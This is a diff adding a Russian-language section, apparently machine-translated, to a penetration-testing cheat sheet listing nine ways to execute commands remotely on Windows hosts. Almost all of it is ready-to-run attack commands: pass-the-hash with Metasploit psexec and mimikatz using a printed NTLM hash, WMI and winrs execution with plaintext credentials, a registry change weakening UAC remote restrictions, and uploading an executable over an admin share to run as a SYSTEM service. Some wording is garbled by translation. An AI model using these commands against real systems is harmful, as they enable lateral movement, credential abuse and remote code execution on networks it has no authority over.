@@ -369,3 +369,83 @@ ls \\ ops-sqlsrvone.lethallab.local \ C $
 - напомним, что делегирование не ограничено SPN, возможно создавать альтернативные билеты.
 
 ```
+#### 9 способов выполнения удаленных команд
+
+Удаленное выполнение команд и соответствующие порты:
+   IPC $ + AT 445
+   PSEXEC 445
+   WMI 135
+   Winrm 5985 (HTTP) и 5986 (HTTPS)
+
+1. WMI выполнить командный режим, без эха:
+```
+wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt
+```
+
+2. Используйте Hash для входа в Windows напрямую (проход HASH)
+Возьмите хеш Windows и получите хеш администратора:
+598DDCE2660D3193AAD3B435B51404EE: 2D20D252A479F485CDF5E171D93985BF
+```
+MSF вызывает полезную нагрузку:
+use exploit/windows/smb/psexec 
+show options
+set RHOST 192.168.81.129
+set SMBPass 598DDCE2660D3193AAD3B435B51404EE: 2D20D252A479F485CDF5E171D93985BF
+set SMBUser Administrator
+```
+
+
+3. mimikatz передает хэш-соединение + при выполнении команды на выполнение запланированной задачи:
+```
+  mimikatz.exe privilege::debug "sekurlsa::pth /domain:./user:administrator /ntlm:2D20D252A479F485CDF5E171D93985BF"
+  dir \\192.168.1.185\c$
+```
+
+4. [WMIcmd ](https://github.com/nccgroup/WMIcmd)
+
+```
+  WMIcmd.exe -h 192.168.1.152 -d hostname -u pt007 -p admin123 -c "ipconfig"
+```
+
+5. Cobalt strkie удаленного выполнения команд и атаки доставки хэшей
+
+
+6. psexec.exe удаленное выполнение команд
+```
+psexec / accepteula // Принять лицензионное соглашение
+sc delete psexesvc
+psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
+```
+
+7.psexec.vbs удаленное выполнение команд
+```
+cscript psexec.vbs 192.168.1.158 pt007 admin123 "ipconfig"
+```
+ 
+
+8. winrm
+// Быстрый запуск службы winrm на мясокомбинате и привязка к порту 5985:
+```
+winrm quickconfig -q
+winrm set winrm/config/Client @{TrustedHosts="*"}
+netstat -ano|find "5985"
+//
+winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /all"
+winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 cmd
+//UAC
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+winrs -r:http://192.168.1.152:5985 -u:pt007 -p:admin123 "whoami /groups"
+```
+
+
+9. Удаленное выполнение команд sc
+// После установления соединения ipc, загрузите ожидающую программу bat или exe в целевую систему и создайте службу (программа будет выполняться на удаленной системе с правами системы при запуске службы):
+
+```net use \\192.168.17.138\c$ "admin123" /user:pt007
+net use
+dir \\192.168.17.138\c$
+copy test.exe \\192.168.17.138\c$
+sc \\192.168.17.138 create test binpath= "c:\test.exe"
+sc \\192.168.17.138 start test
+sc \\192.168.17.138 del test
+```
